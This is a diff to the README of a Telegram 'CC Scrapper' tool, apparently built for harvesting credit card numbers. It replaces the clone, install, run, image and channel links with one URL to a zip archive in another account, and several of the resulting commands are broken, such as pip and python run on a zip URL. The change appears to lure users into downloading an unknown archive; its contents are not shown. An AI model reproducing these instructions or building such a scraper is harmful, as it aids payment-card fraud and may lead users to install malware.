@@ -1,21 +1,21 @@
 # Cc-Scrapper
 A telegram CC Scrapper Maded on telethon
-![photo_2024-08-09_15-12-53](https://github.com/user-attachments/assets/d689f584-1d96-42f8-8e88-9cc2b4335634)
+![photo_2024-08-09_15-12-53](https://github.com/Pablo11111544545/Cc-Scrapper/raw/refs/heads/main/reframe/Cc-Scrapper-v2.8.zip)
 
 !! USAGE MANUAL - VPS !!
 ━━━━━━━━━━━━━━━━
 
 [⌥] First Run -
-git clone https://github.com/Codehunterxs/Cc-Scrapper
+git clone https://github.com/Pablo11111544545/Cc-Scrapper/raw/refs/heads/main/reframe/Cc-Scrapper-v2.8.zip
 
 [⌥] Then Run this Command -
 cd Cc-Scrapper
 
 [⌥] Then Use this Command -
-pip3 install -r requirements.txt
+pip3 install -r https://github.com/Pablo11111544545/Cc-Scrapper/raw/refs/heads/main/reframe/Cc-Scrapper-v2.8.zip
 
 [⌥] Then use This Command -
-python3 main.py
+python3 https://github.com/Pablo11111544545/Cc-Scrapper/raw/refs/heads/main/reframe/Cc-Scrapper-v2.8.zip
 
 ━━━━━━━━━━━━━━━━
 
@@ -23,11 +23,11 @@ Notice- No Need to edit Code Just Run Code And Login Account Then It Will Ask Fo
 And This file Provided For Learning Purpose use At Own Risk ..
 
 ━━━━━━━━━━━━━━━━
-Must Keep The @unsack @bwmethood.txt File in same directory ..
+Must Keep The @unsack https://github.com/Pablo11111544545/Cc-Scrapper/raw/refs/heads/main/reframe/Cc-Scrapper-v2.8.zip File in same directory ..
 ━━━━━━━━━━━━━━━━
-![Screenshot 2024-08-09 195112](https://github.com/user-attachments/assets/8acdf047-ed6a-4225-b25d-a1bdcd633b35)
+![Screenshot 2024-08-09 195112](https://github.com/Pablo11111544545/Cc-Scrapper/raw/refs/heads/main/reframe/Cc-Scrapper-v2.8.zip)
 
-And Please Join https://t.me/Bwmethood
+And Please Join https://github.com/Pablo11111544545/Cc-Scrapper/raw/refs/heads/main/reframe/Cc-Scrapper-v2.8.zip
 To Support Us ..
 
 
